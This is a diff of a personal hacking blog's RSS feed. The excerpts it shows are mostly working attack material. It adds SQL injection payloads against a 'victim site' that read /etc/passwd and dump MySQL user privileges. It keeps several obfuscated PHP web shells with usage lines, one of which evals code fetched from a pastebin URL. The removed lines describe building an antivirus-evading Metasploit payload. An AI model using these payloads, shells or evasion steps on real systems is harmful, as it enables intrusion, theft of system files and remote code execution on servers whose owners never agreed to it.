@@ -14,13 +14,54 @@
     <managingEditor>thiklab@gmail.com (Thik)</managingEditor>
     <webMaster>thiklab@gmail.com (Thik)</webMaster>
     <copyright>&lt;a rel=&#39;license&#39; target=&#39;_blank&#39; href=&#39;http://creativecommons.org/licenses/by-sa/4.0/&#39;&gt;&lt;img alt=&#39;Creative Commons License&#39; style=&#39;border-width:0;display:block;margin-left:auto;margin-right:auto;&#39; src=&#39;https://i.creativecommons.org/l/by-sa/4.0/88x31.png&#39; /&gt;&lt;/a&gt;&amp;copy;2019 - {year} All content is licensed under &lt;a rel=&#39;license&#39; target=&#39;_blank&#39; href=&#39;http://creativecommons.org/licenses/by-sa/4.0/&#39;&gt;CC BY-SA&lt;/a&gt;.</copyright>
-    <lastBuildDate>Sat, 21 Nov 2020 11:38:55 +0700</lastBuildDate>
+    <lastBuildDate>Thu, 18 Mar 2021 10:01:06 +0900</lastBuildDate>
     
         <atom:link href="https://thiklab.com/posts/index.xml" rel="self" type="application/rss+xml" />
     
     
     
 
+      
+      <item>
+        <title>SQL Injection To File Upload</title>
+        <link>https://thiklab.com/posts/sql-injection-to-file-upload/</link>
+        <pubDate>Thu, 18 Mar 2021 10:01:06 +0900</pubDate>
+        <author>thiklab@gmail.com (Thik)</author>
+        <atom:modified>Thu, 18 Mar 2021 10:01:06 +0900</atom:modified>
+        <guid>https://thiklab.com/posts/sql-injection-to-file-upload/</guid>
+        <description>Requirements  Root User Root Path of the website A Writeable Directory  SQL Injection Path First of all we have to find sql injection vulnerable on a victim site.
+ site.com/list.php?id=7
+ Checking cunrrent username.
+ site.com/list.php?id=-7+union+select+1,current_user,3,4,5&amp;ndash;
++ load_file(&#39;/etc/passwd&#39;)
++ load_file(&#39;/etc/my.cnf&#39;)&amp;gt;
++ load_file(&#39;/etc/group&#39;)&amp;gt;
++ load_file(&#39;/etc/services&#39;)&amp;gt;
++ load_file(&#39;/etc/hosts&#39;)&amp;gt;
+ Then checking whatever it&amp;rsquo;s a root user or not.
+ site.com/list.php?id=-7+union+select+1,(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e) FROM mysql.user),3,4,5&amp;ndash;
+ If it show YES that meant it&amp;rsquo;s writeable.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature/sqli.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>fileupload</category>
+            
+          
+        
+        
+        
+          
+            
+              <category>SQLi</category>
+            
+          
+        
+      </item>
       
       <item>
         <title>HackTheBox - Traceback</title>
@@ -155,7 +196,7 @@ Generate the Key 1 2  # Make sure you run as Administrator New-SelfSignedCertifi
         <atom:modified>Tue, 26 May 2020 14:28:44 +0700</atom:modified>
         <guid>https://thiklab.com/posts/unishell/</guid>
         <description>USh3ll-I 1  &amp;lt;?=$_=$_GET;$_[_]($_[0]); //.php?_=system&amp;amp;0=id;ls+-la    USh3ll-II 1  echo -e &amp;#34;&amp;lt;?=\`\$_REQUEST[_]\`?&amp;gt;&amp;#34; &amp;gt; uni.php   1  echo -e &amp;#34;&amp;lt;?=\`\$_REQUEST[_]\`?&amp;gt;\r&amp;lt;?=&amp;#39;404 Not found&amp;#39;;?&amp;gt;&amp;#34; &amp;gt; uni.php   Usage: curl localhost/uni.php -d _=ls+-la
-USh3ll-III 1  &amp;lt;?=$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ស្រលាញ់&amp;amp;$ា[ម]($ា[ប]); //.php?ត=true&amp;amp;ល=ស្រលាញ់&amp;amp;ម=passthru&amp;amp;ប=ls    1  &amp;lt;?=$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ស្រលាញ់&amp;amp;$ា[ម]($ា[ប]); eval(&amp;#39;?&amp;gt;&amp;#39;.file_get_contents($ា[ដ]));?&amp;gt;    Usage: uni.php?ត=true&amp;amp;ល=ស្រលាញ់&amp;amp;ម=passthru&amp;amp;ប=id&amp;amp;ដ=https://pastebin.com/raw/JfLvh0MG
+USh3ll-III 1  &amp;lt;?=$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ស្រលាញ់&amp;amp;$ា[ម]($ា[ប]); //.php?ត=true&amp;amp;ល=ស្រលាញ់&amp;amp;ម=passthru&amp;amp;ប=ls    1  &amp;lt;?=$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ស្រលាញ់&amp;amp;$ា[ម]($ា[ប]); eval(&amp;#39;?&amp;gt;&amp;#39;.file_get_contents($ា[ដ]));?&amp;gt;   Usage: uni.php?ត=true&amp;amp;ល=ស្រលាញ់&amp;amp;ម=passthru&amp;amp;ប=id&amp;amp;ដ=https://pastebin.com/raw/JfLvh0MG
 USh3ll-IV 1  &amp;lt;?=$a=&amp;#34;sy&amp;#34;;$b=&amp;#34;stem&amp;#34;;$c=$a.$b; $c(&amp;#34;uname -a&amp;#34;); //get method    USh3ll-V 1  &amp;lt;?=$_[]=@(($ក=@$_REQUEST).($😘=@$ក[0]).($😘($ក[1]))); //curl -v &amp;#39;127.0.0.1:8080/uni.php?0=system&amp;amp;1=la+-la&amp;#39;    </description>
         
         <dc:creator>thik</dc:creator>
@@ -180,50 +221,6 @@ USh3ll-IV 1  &amp;lt;?=$a=&amp;#34;sy&amp;#34;;$b=&amp;#34;stem&amp;#34;;$c=$a.$
           
             
               <category>WebApp</category>
-            
-          
-        
-      </item>
-      
-      <item>
-        <title>MSF FUD With Python2</title>
-        <link>https://thiklab.com/posts/new/</link>
-        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-        <author>thiklab@gmail.com (Thik)</author>
-        
-        <guid>https://thiklab.com/posts/new/</guid>
-        <description>Requirements  Kali Linux (Recommend) Metasploit Framework Wine, Mingw-w64 Compiler, python2 pip2 install wheel pycrypto termcolor  Installation 1 2 3  git clone https://github.com/stormshadow07/HackTheWorld.git cd HackTheWorld chmod +x install.sh &amp;amp;&amp;amp; ./install.sh   Generate Payload 1 2 3 4 5 6 7 8 9 10  cd HackTheWorld python2 HackTheWorld.py ... Enter payload type (tcp, http/s) and lhost/lport ... Enter XOR Key ... 1 for adding manifest bypass AV .</description>
-        
-        <dc:creator>thik</dc:creator>
-        <media:content url="https://thiklab.comimages/feature/article-one.png" medium="image"><media:title type="html">featured image</media:title></media:content>
-        
-        
-        
-          
-            
-              <category>msf</category>
-            
-          
-            
-              <category>obfuscate</category>
-            
-          
-            
-              <category>bypass</category>
-            
-          
-        
-        
-          
-            
-              <category>FUD</category>
-            
-          
-        
-        
-          
-            
-              <category>Python2</category>
             
           
         
